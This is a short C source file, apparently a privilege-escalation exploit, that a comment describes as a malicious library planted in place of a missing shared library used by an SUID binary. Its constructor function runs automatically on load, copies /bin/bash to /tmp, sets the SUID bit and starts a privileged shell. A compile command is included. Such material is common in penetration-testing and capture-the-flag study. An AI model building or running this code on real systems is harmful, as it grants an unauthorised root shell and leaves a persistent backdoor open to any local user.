// gcc -shared -o sharedlib.so -fPIC sharedlib.c
// This malicious library replaces a missing shared library relied upon by an SUID binary

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

